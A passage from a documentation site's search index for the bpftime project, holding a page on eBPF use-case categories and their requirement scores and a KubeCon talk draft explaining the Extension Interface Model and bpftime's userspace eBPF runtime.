<p>Testing and Error Injection</p> </li> <li>Fault Injection for Resilience Testing</li> <li>Dynamic Behavior Simulation</li> <li>Performance Benchmarking</li> <li> <p>Dynamic Debugging</p> </li> <li> <p>Patch Fixing and Dynamic Updates</p> </li> <li>Hotfix Deployment</li> <li>Feature Flag Management</li> <li>Runtime Code Injection</li> <li>Dynamic Configuration Updates</li> </ol> <p>These categories not only align with the kernel eBPF use cases but also expand into areas specifically relevant to userspace applications. By leveraging a userspace extension framework with these capabilities, developers can create more adaptable, secure, and high-performing applications that can respond dynamically to changing conditions and requirements.</p>"},{"location":"others/usecases/#core-requirements","title":"Core Requirements","text":""},{"location":"others/usecases/#1-policy-tuning_2","title":"1. Policy Tuning","text":"<p>Definition: Dynamically adjusting application or system policies to optimize performance, resource usage, or behavior based on real-time conditions.</p> <p>Core Requirements:</p> <ul> <li>Performance (9): Ensure that dynamic policy adjustments enhance or maintain system/application performance without introducing overhead.</li> <li>Security (6): While not the primary focus, policies should not compromise security; important but secondary to performance.</li> <li>Expressiveness (8): Ability to define complex and programmable policies that cater to diverse scenarios.</li> <li>Flexibility (8): Adapt policies seamlessly to varying conditions and requirements in real-time.</li> <li>Control (7): Enable dynamic adjustments of policies via control mechanisms, such as updating parameters based on monitoring data.</li> </ul> <p>Examples:</p> <ul> <li>Kernel:</li> <li> <p>Dynamic CPU Scheduling: Utilizing eBPF to adjust the scheduler\u2019s behavior based on real-time CPU load, prioritizing critical processes to ensure responsive performance under high load.</p> </li> <li> <p>Userspace:</p> </li> <li>Dynamic Resource Allocation: A web server dynamically adjusts its thread pool size based on current traffic, scaling resources up or down to optimize performance and resource utilization.</li> </ul>"},{"location":"others/usecases/#2-event-monitoring-and-observability_2","title":"2. Event Monitoring and Observability","text":"<p>Definition: Real-time collection and analysis of kernel and user-space events for monitoring, diagnostics, and performance analysis.</p> <p>Core Requirements:</p> <ul> <li>Performance (7): Minimize the overhead introduced by monitoring to prevent performance degradation.</li> <li>Security (8): Protect sensitive data during monitoring and ensure integrity of collected data.</li> <li>Expressiveness (8): Capture a wide range of events and conditions with the ability to define custom metrics.</li> <li>Flexibility (7): Customize monitoring to focus on relevant events and adjust as needed.</li> <li>Control (7): Allow dynamic adjustments of monitoring parameters via control interfaces.</li> </ul> <p>Examples:</p> <ul> <li>Kernel:</li> <li> <p>System Tracing: Using tools like bpftrace to attach eBPF programs to tracepoints, enabling detailed monitoring of system calls and kernel functions.</p> </li> <li> <p>Userspace:</p> </li> <li>Real-Time Metrics Collection: An application increases logging verbosity during peak times to diagnose performance issues without restarting or redeploying.</li> </ul>"},{"location":"others/usecases/#3-high-speed-data-processing_2","title":"3. High-Speed Data Processing","text":"<p>Definition: Implementing high-performance data processing within applications to handle large volumes of data with minimal latency.</p> <p>Core Requirements:</p> <ul> <li>Performance (9): Critical to process data efficiently with minimal latency.</li> <li>Security (5): Ensure that data processing does not introduce vulnerabilities; maintain data integrity.</li> <li>Expressiveness (7): Ability to implement diverse and complex data processing logic.</li> <li>Flexibility (8): Adapt processing strategies dynamically based on data patterns or workload.</li> <li>Control (7): Adjust processing parameters and logic dynamically through control mechanisms.</li> </ul> <p>Examples:</p> <ul> <li>Kernel:</li> <li> <p>XDP (eXpress Data Path): Processing network packets at the earliest point to perform actions like filtering or load balancing with minimal latency.</p> </li> <li> <p>Userspace:</p> </li> <li>In-Memory Data Optimization: A real-time analytics platform adjusts data structures based on incoming data patterns to improve throughput.</li> </ul>"},{"location":"others/usecases/#4-access-control-and-security_2","title":"4. Access Control and Security","text":"<p>Definition: Dynamically enforcing access control policies and security measures to protect applications and data.</p> <p>Core Requirements:</p> <ul> <li>Performance (7): Implement security measures without causing significant performance overhead.</li> <li>Security (9): Primary focus on protecting against unauthorized access and threats.</li> <li>Expressiveness (7): Define detailed and nuanced access control policies.</li> <li>Flexibility (8): Adapt security policies in response to evolving threats and operational conditions.</li> <li>Control (7): Manage and adjust security policies dynamically via control interfaces.</li> </ul> <p>Examples:</p> <ul> <li>Kernel:</li> <li> <p>LSM Enhancements: Using eBPF to dynamically update firewall rules based on real-time threat intelligence.</p> </li> <li> <p>Userspace:</p> </li> <li>Dynamic Permission Management: Applications adjust user permissions in real-time based on contextual factors like user behavior or device security status.</li> </ul>"},{"location":"others/usecases/#5-testing-and-error-injection_2","title":"5. Testing and Error Injection","text":"<p>Definition: Utilizing dynamic capabilities to perform system testing, debugging, and injecting errors to verify robustness and fault tolerance.</p> <p>Core Requirements:</p> <ul> <li>Performance (8): Conduct testing and error injections without significantly impacting performance.</li> <li>Security (7): Ensure testing processes do not expose vulnerabilities or compromise security.</li> <li>Expressiveness (7): Simulate a wide range of test scenarios and error conditions.</li> <li>Flexibility (8): Adapt tests to various conditions and requirements dynamically.</li> <li>Control (8): Precisely manage testing parameters and error injection points via control mechanisms.</li> </ul> <p>Examples:</p> <ul> <li>Kernel:</li> <li> <p>Fault Injection: Using eBPF to simulate conditions like memory allocation failures to test kernel and application resilience.</p> </li> <li> <p>Userspace:</p> </li> <li>Resilience Testing: Injecting simulated network outages within an application to verify its ability to recover and maintain stability.</li> </ul>"},{"location":"others/usecases/#6-patch-fixing-and-dynamic-updates_2","title":"6. Patch Fixing and Dynamic Updates","text":"<p>Definition: Applying patches, updates, or fixes to applications at runtime to address vulnerabilities or optimize functionalities without restarting the system.</p> <p>Core Requirements:</p> <ul> <li>Performance (8): Apply patches without introducing performance penalties during or after the update.</li> <li>Security (9): Ensure patches securely fix vulnerabilities without creating new ones.</li> <li>Expressiveness (7): Support a wide range of patches and updates, including complex changes.</li> <li>Flexibility (8): Adapt the patching process to different types of updates and system states.</li> <li>Control (9): Provide robust mechanisms to manage patch application dynamically.</li> </ul> <p>Examples:</p> <ul> <li>Kernel:</li> <li> <p>Dynamic Vulnerability Patching: Using eBPF to modify the behavior of vulnerable kernel functions on-the-fly.</p> </li> <li> <p>Userspace:</p> </li> <li>Hotfix Deployment: Applying critical security patches to a running application without downtime, maintaining continuous operation.</li> </ul>"},{"location":"others/usecases/#summary-of-core-requirements-importance","title":"Summary of Core Requirements Importance","text":"Category Performance Security Expressiveness Flexibility Control 1. Policy Tuning 9 6 8 8 7 2. Event Monitoring and Observability 7 8 8 7 7 3. High-Speed Data Processing 9 5 7 8 7 4. Access Control and Security 7 9 7 8 7 5. Testing and Error Injection 8 7 7 8 8 6. Patch Fixing and Dynamic Updates 8 9 7 8 9"},{"location":"others/usecases/#key-insights","title":"Key Insights","text":"<ol> <li>Performance is crucial in Policy Tuning and High-Speed Data Processing, where efficiency and low overhead are essential.</li> <li>Security is paramount in Access Control and Security and Patch Fixing and Dynamic Updates, focusing on protecting against threats and vulnerabilities.</li> <li>Expressiveness allows for defining complex policies and logic, important across all categories for tailored solutions.</li> <li>Flexibility is consistently important, enabling dynamic adaptation to changing conditions and requirements.</li> <li>Control mechanisms are vital for managing and adjusting behaviors, policies, and updates dynamically across all categories.</li> </ol>"},{"location":"others/usecases/#conclusion","title":"Conclusion","text":"<p>This refined overview focuses on the five core requirements of Performance, Security, Expressiveness, Flexibility, and Control across the six categories of eBPF use cases:</p> <ol> <li>Policy Tuning</li> <li>Event Monitoring and Observability</li> <li>High-Speed Data Processing</li> <li>Access Control and Security</li> <li>Testing and Error Injection</li> <li>Patch Fixing and Dynamic Updates</li> </ol> <p>By concentrating on these key aspects, developers and system administrators can prioritize and implement eBPF-based solutions that enhance application and system performance, security, and adaptability. This approach ensures that dynamic adjustments, real-time monitoring, and seamless integration with control mechanisms are effectively addressed in various use cases, leading to robust and efficient systems.</p> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/","title":"eBPF and Wasm: Unifying Userspace Extensions With Bpftime - Yusheng Zheng, eunomia-bpf","text":"<p>Thursday April 3, 2025 14:15 - 14:45 BST Level 1 | Hall Entrance S10 | Room D</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#abstract","title":"Abstract","text":"<p>In cloud-native systems, extending and customizing applications is key to improving development, deployment, and observability. eBPF is powerful for kernel-level enhancements, and WebAssembly brings extension to userspace. Yet, both face challenges when userspace extensions need to interact deeply with host applications. eBPF's kernel-focused design struggles in diverse userspace environments, and Wasm's sandboxing introduces overhead and complexity due to extra checks and data copying. Enter bpftime, a framework that extends eBPF's capabilities into userspace. Using dynamic binary instrumentation, bytecode verification, and hardware isolation, bpftime allows secure, high-performance extensions without the overhead of Wasm's sandboxing. This talk explores how bpftime works with the eBPF Interface to simplify userspace extensions, compares the evolution of eBPF and Wasm, and shows how bpftime can power observability, networking, and other cloud-native extensions.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slides-and-texts","title":"Slides and texts","text":""},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-1-title","title":"Slide 1: Title","text":"<p>eBPF and Wasm: Unifying Userspace Extensions With Bpftime</p> <p>[VISUAL: Title slide with bpftime logo, eBPF and Wasm logos on opposite sides with an arrow connecting them through bpftime]</p> <p>Good afternoon, everyone! My name is Yusheng Zheng, I'm a PhD student at UC Santa Cruz and I'm maintaining several eBPF-related open source projects in the eunomia-bpf community. Today, I'm going to talk about something that has been around in the software industry for a really long time\u2014software extensions.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-2-agenda","title":"Slide 2: Agenda","text":"<p>[VISUAL: Agenda with icons for each section]</p> <ul> <li>Introduction to Application Extensions</li> <li>Challenges: Safety vs. Interconnectedness</li> <li>Limitations of Existing Solutions</li> <li>EIM: A Fine-Grained Interface Model</li> <li>bpftime: Efficient Runtime Design</li> <li>Use Cases &amp; Evaluation</li> <li>Conclusion</li> </ul> <p>Specifically, I want to talk about why we need extensions, what makes them challenging to handle correctly, and how our current approaches to managing extensions might not be good enough. Then I'll introduce a new approach to managing extensions called the Extension Interface Model (EIM) and our experimental userspace eBPF runtime called bpftime that implements these principles. This is also a research project that has been accepted by OSDI 2025.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-3-the-history-of-software-extensions","title":"Slide 3: The History of Software Extensions","text":"<p>[VISUAL: Timeline showing evolution of extension systems with icons for each example]</p> <ul> <li>Extensions have deep roots in software development</li> <li>Common examples across the industry:</li> <li>Web servers: nginx/Apache modules</li> <li>Databases: Redis and PostgreSQL extensions</li> <li>Editors: Vim, Emacs, VSCode plugins</li> <li>Cloud-native: Kubernetes extensions</li> <li>Kernel: eBPF programs, kernel modules</li> </ul> <p>So, first, let's step back a little bit. Software extensions aren't new\u2014they have a very long history. If you've been around software for a while, you might remember Apache HTTP Server modules, browser plugins, or even IDE extensions like VSCode plugins. Extensions are everywhere because we, as engineers, really love flexibility. We love building a core application and then letting other developers or even users customize or add extra features later, without needing to rewrite the original software.</p> <p>Think about web servers. In nginx or Apache, you can use modules or plugins to add extra functionality like authentication, caching, compression, or even application-level firewalls. Database systems like Redis and PostgreSQL have extensions to support new query types, custom data formats, or security audits. Our editors\u2014Vim, Emacs, VSCode\u2014all thrive thanks to the flexibility offered by extensions or plugins. In cloud-native systems like Kubernetes, you can use extensions to add observability features like custom metrics collection and tracing. You can extend networking with custom CNI plugins or service mesh sidecars. Security extensions can add policy enforcement, vulnerability scanning, or runtime threat detection. The flexibility of extensions is what makes Kubernetes such a powerful platform for building modern applications. In kernel level, for example, you can use eBPF programs or kernel modules to add custom kernel behaviors.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-4-why-use-extensions","title":"Slide 4: Why Use Extensions?","text":"<p>[VISUAL: Balance scale showing flexibility and isolation on opposite sides]</p> <ul> <li>Flexibility: Adapt software without core codebase changes</li> <li>Customization: Meet specific requirements without waiting for core developers</li> <li>Isolation: Critical for security and stability</li> <li>External code may contain bugs or malicious elements</li> <li>Need to protect the core application</li> <li>The Fundamental Tension: More flexibility often means less isolation</li> </ul> <p>But here's a big question: why don't we just integrate everything into the main codebase directly? Why bother with extensions at all?</p> <p>The short answer is\u2014flexibility and isolation.</p> <p>We want flexibility because it makes our software adaptable. Users and administrators want to tweak things to meet their specific requirements without waiting for the core developers to implement changes. But flexibility without isolation is risky. Extensions, by definition, are third-party or at least externally-developed code. You might trust your core engineering team, but trusting external code is a different story. Even if it's not malicious, external code can have bugs. And we all know how easily bugs can creep into our systems, causing all sorts of problems\u2014crashes, performance degradation, or even security vulnerabilities.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-5-real-world-extension-failures","title":"Slide 5: Real-World Extension Failures","text":"<p>[VISUAL: \"Incident Report\" style graphics showing each failure case with impact metrics]</p> <ul> <li>Bilibili: Production outage from nginx extension infinite loop</li> <li>Service disruption affecting millions of users</li> <li>Apache HTTP Server: Buffer overflows in Lua modules</li> <li>Security vulnerabilities and system crashes</li> <li>Redis: Improperly sandboxed Lua scripts</li> <li>Remote code execution vulnerabilities</li> <li>These aren't theoretical risks\u2014they've cost companies money and reputation</li> </ul> <p>Let me give you some real-world examples. A few years back, the popular video streaming site Bilibili suffered a serious production outage because one of their nginx extensions got stuck in an infinite loop. Apache HTTP Server had similar issues where buffer overflow bugs in a Lua-based module caused crashes and security holes. Even Redis had cases where improperly sandboxed Lua scripts resulted in remote code execution vulnerabilities. These aren't theoretical risks\u2014these are things that have actually hurt big companies and cost serious money and reputation.</p> <p>So, isolation and safety become absolutely critical. We don't want a bug in one extension to crash our entire system. We don't want a poorly-written plugin causing our service to slow down. We definitely don't want external code exposing our internal data to attackers.</p> <p>But achieving isolation isn't easy. There's always a tradeoff. If you isolate too strictly, you lose expressiveness\u2014extensions become so limited they're no longer useful. If you're too loose, bugs or malicious code can harm your system.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-6-traditional-extension-approaches","title":"Slide 6: Traditional Extension Approaches","text":"<p>[VISUAL: Spectrum showing different approaches with isolation vs performance tradeoffs]</p> <ul> <li>Dynamic Loading: Shared libraries, DLLs, LD_PRELOAD</li> <li>\u2705 Fast and flexible</li> <li>\u274c Minimal isolation, no safety boundary</li> <li>Scripting Languages: Lua, Python</li> <li>\u2705 Easy integration</li> <li>\u274c Safety depends on host implementation</li> <li>Process-Level Isolation: Subprocesses, API calls</li> <li>\u2705 Strong isolation</li> <li>\u274c High overhead from context switches</li> </ul> <p>So, how have engineers traditionally tried to deal with this balance?</p> <p>We've tried many things. Early on, we used dynamically loadable modules\u2014shared libraries, DLLs, LD_PRELOAD hacks. They're great for speed and flexibility. But they have virtually no isolation. A bug in a dynamically-loaded module is a bug in your entire application. There's no safety boundary.</p> <p>Later, people adopted scripting languages like Lua and Python for extensions. Languages like Lua are still hugely popular because they're easy to integrate and relatively safe. Redis and nginx are good examples here. But Lua scripts have their own challenges. They rely heavily on the host application to provide security boundaries, which means if the host makes a mistake\u2014maybe not checking array bounds correctly or missing resource limits\u2014the safety promise falls apart. And as we've seen from real incidents, host applications frequently get this wrong.</p> <p>A lot of extensions, especially in the cloud-native space, are integrated through process level isolation, such as subprocesses or API calls. They use OS context switches, adding microseconds of overhead\u2014which is OK for distributed systems, but not for performance-critical applications.</p> <p>Wasm and eBPF are two popular extension frameworks that have been around for a while. Let's take a look at how they handle the balance between interconnectedness and safety.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-7-webassembly-for-extensions","title":"Slide 7: WebAssembly for Extensions","text":"<p>[VISUAL: Diagram showing Wasm sandbox with import/export boundaries between host and extension]</p> <ul> <li>Software fault isolation (SFI) provides strong security</li> <li>Explicit import/export mechanisms for host communication</li> <li>Benefits:</li> <li>Strong memory isolation</li> <li>Cross-platform compatibility</li> <li>Growing ecosystem</li> <li>Limitations:</li> <li>Heavyweight for thousands of small extensions</li> <li>Communication overhead between extension and host</li> <li>Complex interface management</li> </ul> <p>Then WebAssembly (or Wasm) came along, promising much better isolation and performance. Wasm uses software fault isolation techniques, which means it's safer because it doesn't blindly trust the extension code. That's why many modern browsers and even server-side applications are moving towards Wasm. </p> <p>But Wasm introduces another issue\u2014the interfaces between extensions and hosts. Wasm needs explicit import/export mechanisms to talk to the host application, and managing this communication can be tricky. It's powerful, but it's still heavyweight, especially if you're running thousands of little extensions or making frequent calls back and forth.</p> <p>What do I mean by \"heavyweight\"? Every time a Wasm module needs to access host functionality, it must cross the sandbox boundary. This involves marshaling data between the Wasm environment and host, which adds overhead. For applications that need frequent host interactions, these costs add up quickly.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-8-ebpf-for-extensions","title":"Slide 8: eBPF for Extensions","text":"<p>[VISUAL: Architecture diagram showing eBPF in kernel space with verifier, JIT compiler, and hooks into various subsystems]</p> <ul> <li>Originally for network packet filtering, now widely used</li> <li>Key components:</li> <li>Verifier ensures safety before execution</li> <li>JIT compiler for near-native performance</li> <li>Userspace tracing via uprobes and USDT</li> <li>Performance-first design:</li> <li>Load-time verification instead of runtime checks</li> <li>No sandboxing overhead</li> <li>Automatic instrumentation without application changes</li> </ul> <p>At the kernel level, eBPF has become the star of the show. Originally designed for network packet filtering, eBPF is now widely used for security monitoring, observability, and even performance optimization at kernel level. eBPF programs run isolated from the kernel itself, thanks to a verifier and JIT compiler that ensures safe execution.</p> <p>But eBPF is not limited to kernel. For userspace tracing, eBPF leverages mechanisms like uprobes (dynamic function instrumentation) and USDT probes (User Statically-Defined Tracing points). These probes eliminate the need for manual instrumentation - developers don't need to modify their application code to enable tracing. Uprobes can dynamically instrument any function in userspace programs, while USDT provides static tracepoints that are more efficient but require compile-time integration. This automatic instrumentation capability makes eBPF powerful for observability without requiring changes to the target application.</p> <p>Compared with Wasm, eBPF has a history of focusing on performance first, which led to the design of using a verifier to check the safety of the extension at load time, instead of runtime checking or SFI (software fault isolation) like Wasm.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-9-three-core-requirements-for-extension-frameworks","title":"Slide 9: Three Core Requirements for Extension Frameworks","text":"<p>[VISUAL: Triangle diagram with \"Interconnectedness,\" \"Safety,\" and \"Efficiency\" at the corners, showing the tension between them]</p> <ul> <li>Interconnectedness: Extension's ability to interact with host</li> <li>Reading data, modifying state, calling internal functions</li> <li>Example: nginx extension reading request details</li> <li>Safety: Limiting extensions' ability to harm the application</li> <li>Memory safety, control flow restrictions, resource limits</li> <li>Efficiency: Performance impact on the system</li> <li>The Fundamental Tension: More interconnectedness typically means less safety</li> </ul> <p>As we can see, there are three core requirements for extension frameworks: interconnectedness, safety and efficiency. Efficiency is easy to understand, it's about performance. Let's dive deeper into the core issue we're really focusing on today\u2014this fundamental tension between interconnectedness and safety. This is what we think makes software extensions challenging, and also why getting the interface right is so hard, yet so important.</p> <p>So, first off, what do I mean by interconnectedness? Simply put, interconnectedness is how much power we give an extension to interact with the host application. Think of it like this: extensions usually need to do something meaningful\u2014they're not just isolated pieces of code floating around. They actually need to communicate with the main application to read data, modify state, or even call existing functions inside the application. For example, let's say you have an nginx web server. An extension that monitors web requests for security needs to read the request details from the host application. It might also need to call a built-in nginx function to quickly respond or block a suspicious request. This is interconnectedness\u2014extensions working directly with the application's resources or calling its internal functions.</p> <p>On the flip side, safety is how much we limit an extension's ability to interact with or alter the main application. Safety means that if there's a bug in your extension\u2014let's face it, we all write buggy code sometimes\u2014this bug won't crash your whole web server or compromise your entire application. If we didn't care about safety, extensions could freely do whatever they wanted\u2014read or write any memory, call any function, open files they shouldn't, or even alter sensitive configuration data. Obviously, this would be a recipe for disaster. A single small mistake in an extension could take down a whole production system or open it up to security vulnerabilities. And trust me, that has happened many times before. Like that time Bilibili's nginx extensions got into a loop and brought their production servers offline, causing a major outage.</p> <p>So here's the key issue: interconnectedness and safety are fundamentally at odds. The more interconnectedness you allow\u2014the more you let extensions interact with the host\u2014the less inherently safe it becomes. And vice versa: to keep things perfectly safe, you have to restrict interconnectedness. And that means extensions become severely limited in their usefulness. You can't have an effective firewall extension if you don't allow it to inspect web requests. You can't meaningfully monitor performance if your monitoring extension can't read internal state from the host application. So, balancing this tension is a core challenge.</p> <p>Now, historically, software frameworks have not handled this tradeoff very well. Usually, they fall into one of two extremes. Either they allow too much interconnectedness, like dynamically loaded modules\u2014these run fast, sure, but they provide almost no safety at all. One bug and your entire application crashes. Or, on the other extreme, they provide strong safety through heavy isolation, like sandboxed scripting environments or subprocess isolation methods. But these can cripple interconnectedness and performance\u2014extensions often become slow and limited in what they can do.</p> <p>So, what we've found is that the key to managing this tension\u2014this interconnectedness versus safety tradeoff\u2014is the interface we choose for extensions. If your extension framework's interface can carefully define and verify exactly which resources and functions an extension can use, you can precisely manage this tension. Ideally, you give the extension just enough interconnectedness to do its job\u2014but absolutely no more. This sounds simple, but current systems struggle to achieve this.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-10-webassembly-interface-approach","title":"Slide 10: WebAssembly Interface Approach","text":"<p>[VISUAL: Diagram showing Wasm sandbox with import/export boundaries and runtime checks]</p> <ul> <li>Runtime checks through Software Fault Isolation (SFI)</li> <li>Explicit import/export boundary for host communication</li> <li>Component Model evolution for better interfaces</li> <li>Tradeoffs:</li> <li>\u2705 Strong isolation guarantees</li> <li>\u2705 Cross-platform compatibility</li> <li>\u274c Runtime overhead for every operation</li> <li>\u274c Complex interface management</li> <li>\u274c Data marshaling costs</li> </ul> <p>WebAssembly uses Software Fault Isolation (SFI) to provide safety. This means it adds runtime checks to ensure memory accesses stay within bounds and control flow remains valid. While this provides strong isolation, it adds overhead to every operation. </p> <p>Wasm modules interact with hosts through explicit import/export mechanisms, which require careful interface design and data marshaling. Every time a Wasm module needs to access host functionality, it must cross the sandbox boundary, which involves converting data between formats.</p> <p>The Wasm Component Model is evolving to address some interface challenges by providing more structured interfaces and better composition, but the fundamental runtime overhead remains.</p> <p>This approach is excellent for security-critical applications where isolation is paramount, but the performance cost can be significant for extensions that frequently interact with the host application.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-11-ebpf-interface-approach","title":"Slide 11: eBPF Interface Approach","text":"<p>[VISUAL: Diagram showing eBPF verifier analyzing code paths at load time]</p> <ul> <li>Load-time verification through static analysis</li> <li>Helper functions and maps for host interaction</li> <li>Tradeoffs:</li> <li>\u2705 No runtime overhead after verification</li> <li>\u2705 Automatic instrumentation capabilities</li> <li>\u2705 Efficient host interaction through maps</li> <li>\u274c Limited to kernel context traditionally</li> <li>\u274c Userspace requires costly kernel traps</li> </ul> <p>In contrast, eBPF uses a verifier to analyze programs before they run. This verifier checks all possible execution paths to ensure memory safety and prevent infinite loops. This approach shifts safety checks from runtime to load-time, eliminating runtime overhead once the program is loaded. </p> <p>eBPF programs interact with the host through predefined helper functions and map structures, which are designed for efficient data sharing.</p> <p>The key difference is when safety is enforced: Wasm checks at runtime (adding overhead to every operation), while eBPF verifies everything upfront (adding overhead only when loading the program).</p> <p>However, current userspace eBPF implementations like uprobes require costly kernel traps. Every time a userspace extension runs, it triggers a context switch into the kernel, runs the extension, and switches back. This is too slow for many performance-critical scenarios.</p> <p>What if we could combine eBPF's load-time verification with efficient userspace execution? That's where our approach comes in.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-12-extension-interface-model-eim-overview","title":"Slide 12: Extension Interface Model (EIM) - Overview","text":"<p>[VISUAL: Diagram showing EIM as a bridge between extensions and host applications with capability controls]</p> <ul> <li>Our approach: Extension Interface Model (EIM)</li> <li>Inspired by eBPF's verifier and Wasm's component model</li> <li>Key advantages:</li> <li>Load-time safety guarantees eliminate runtime overhead</li> <li>Fine-grained control over extension capabilities</li> <li>No manual safety checks required from developers</li> <li>Core insight: Treat all extension-host interactions as explicit capabilities</li> <li>Follows principle of least privilege for extensions</li> </ul> <p>Our approach, the Extension Interface Model or EIM, takes inspiration from eBPF's verifier-based model and Wasm's component model, but applies it at the user-space level for general extension frameworks.</p> <p>Why did we choose a verifier-based approach? There are three key reasons:</p> <ol> <li>Load-time safety guarantees - We verify everything before execution, eliminating runtime overhead</li> <li>Fine-grained control - We can precisely tailor what each extension can access</li> <li>Elimination of manual safety checks - We remove the burden from developers, preventing the bugs and security flaws that have plagued extension systems</li> </ol> <p>The core insight of EIM is treating every interaction between an extension and its host as an explicit capability that can be controlled. Think of it as a permission system designed specifically for extensions.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-13-eim-usage-model-and-principals","title":"Slide 13: EIM - Usage Model and Principals","text":"<p>[VISUAL: Triangle diagram showing the three principals in EIM: Application Developers, Extension Manager, and Input Provider]</p> <ul> <li>Key roles in the EIM model:</li> <li>Application Developers: Trusted but fallible developers of host application and extensions</li> <li>Extension Manager: Trusted administrator who configures extension permissions</li> <li>Input Provider: Potentially untrusted source of inputs to the application</li> <li>Security goal: Limit impact of exploitable bugs, not prevent malicious extensions</li> <li>Example: Web browser with password manager and ad blocker extensions</li> <li>Extensions need different capabilities (DOM access, storage access)</li> <li>EIM limits what each extension can do if exploited</li> </ul> <p>Let me explain EIM's usage model. It involves three key roles: First, we have application developers who create both the host application and extensions. They're trusted but fallible - meaning they're not malicious, but their code might contain bugs. Second, we have the extension manager - typically a system administrator - who configures which extensions can access which capabilities. Third, we have input providers - potentially untrusted sources of input to the application, like websites in a browser.</p> <p>EIM doesn't try to prevent malicious extensions from being installed - that's a different problem. Instead, it aims to limit the damage that could happen if a buggy extension gets exploited through malicious input. For example, in a web browser with a password manager and an ad blocker, the extension manager would give the ad blocker permission to modify DOM elements related to ads, but not access to stored passwords. If a malicious website exploits the ad blocker, it would only be able to modify ad-related DOM elements, not steal passwords.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-14-eim-development-time-specification","title":"Slide 14: EIM - Development-Time Specification","text":"<p>[VISUAL: Code example showing development-time EIM specification with annotations]</p> <ul> <li>Created by application developers</li> <li>Defines three types of capabilities:</li> <li>State Capabilities: Read/write access to application variables<ul> <li>Example: <code>readPid</code> for accessing process ID</li> </ul> </li> <li>Function Capabilities: Ability to call host functions<ul> <li>Example: <code>nginxTime</code> with constraint that return value &gt; 0</li> </ul> </li> <li>Extension Entries: Points where extensions can hook into application<ul> <li>Example: <code>processBegin</code> at request processing start</li> </ul> </li> </ul> <p>EIM specifications come in two parts. First, at development time, application developers create a specification that defines all the possible capabilities that extensions might need. This includes three types of capabilities:</p> <p>State capabilities represent the ability to read or write specific variables in the host application. For example, in nginx, we might define a capability called \"readPid\" that allows reading the process ID variable.</p> <p>Function capabilities represent the ability to call specific functions in the host application. For instance, we might define a capability called \"nginxTime\" that allows calling nginx's time function. We can also add constraints, like requiring that the return value must be positive.</p> <p>Extension entries define the specific points in the application where extensions can hook in. For example, in nginx, we might define extension entries at the beginning of request processing and at the content generation phase.</p> <p>This development-time specification essentially creates a catalog of all the ways extensions might interact with the host application.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-15-eim-deployment-time-specification","title":"Slide 15: EIM - Deployment-Time Specification","text":"<p>[VISUAL: Code example showing deployment-time EIM specification with annotations]</p> <ul> <li>Created by system administrators/extension managers</li> <li>Defines Extension Classes that specify:</li> <li>Which extension entry point to use</li> <li>Exactly which capabilities are allowed</li> <li>Example extension classes:</li> <li><code>observeProcessBegin</code>: Can read request data but not modify it</li> <li><code>updateResponse</code>: Can both read and write to response data</li> <li>Enforces principle of least privilege for each extension</li> </ul> <p>The second part of EIM is the deployment-time specification, created by system administrators or extension managers. This is where the actual security boundaries get defined.</p> <p>The deployment-time specification defines extension classes, each associated with a specific extension entry point. For each class, it specifies exactly which capabilities from the development-time specification are allowed.</p> <p>For example, we might define an \"observeProcessBegin\" class that allows extensions to read request data but not modify it. We might also define an \"updateResponse\" class that allows both reading and writing to response data.</p> <p>This approach enforces the principle of least privilege - each extension gets only the capabilities it needs to do its job, and nothing more. If an extension gets compromised, the damage is limited to the capabilities it was granted.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-16-bpftime-eims-efficient-runtime-implementation","title":"Slide 16: bpftime: EIM's Efficient Runtime Implementation","text":"<p>[VISUAL: Architecture diagram showing how bpftime implements EIM principles]</p> <ul> <li>bpftime: Our userspace eBPF runtime that implements EIM</li> <li>Key features:</li> <li>Brings eBPF concepts fully into userspace</li> <li>Uses eBPF verifier for load-time safety checks</li> <li>Near-native performance without kernel traps</li> <li>Compatible with kernel eBPF ecosystem</li> <li>Supports 10+ map types and 30+ helpers</li> </ul> <p>Now, let's talk about bpftime, which is our concrete implementation of the EIM principles. bpftime is a userspace eBPF runtime that supports tracing features like Uprobe, USDT, syscall tracepoints, and even network features like XDP, all in userspace. </p> <p>It supports more than 10 map types and 30 helpers, so it's highly compatible with the kernel eBPF ecosystem. It builds on top of eBPF concepts but brings them fully into user-space. bpftime uses the same verification and safety guarantees as kernel-level eBPF, ensuring that an extension can't step outside its defined boundaries. Plus, it leverages modern hardware isolation features (like Intel's Memory Protection Keys\u2014MPK) to give near-native performance without the heavyweight overhead of context switches or traps that traditional solutions like uprobes suffer from.</p> <p>You can use your familiar way to develop and deploy eBPF programs, but in userspace. bpftime can run alongside kernel eBPF, using kernel eBPF maps and working together with kprobe.</p> <p>We started developing bpftime 2 years ago, and adapted it to efficiently enforce these permissions from the EIM model this year.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-17-bpftime-concealed-extension-entries","title":"Slide 17: bpftime - Concealed Extension Entries","text":"<p>[VISUAL: Before/after diagram showing binary code without hooks, then with dynamically injected hooks]</p> <ul> <li>Novel approach to reduce overhead when extensions aren't active</li> <li>Traditional approach: Static hooks always present in code</li> <li>Causes performance overhead even when unused</li> <li>bpftime's approach: Concealed extension entries</li> <li>Uses binary rewriting to dynamically inject hooks only when needed</li> <li>Zero overhead when extensions aren't in use</li> <li>Automatically activates when extensions are loaded</li> <li>Example: Web server with 50 potential extension points</li> <li>Traditional: All 50 checks happen on every request</li> <li>bpftime: Only points with active extensions have hooks</li> 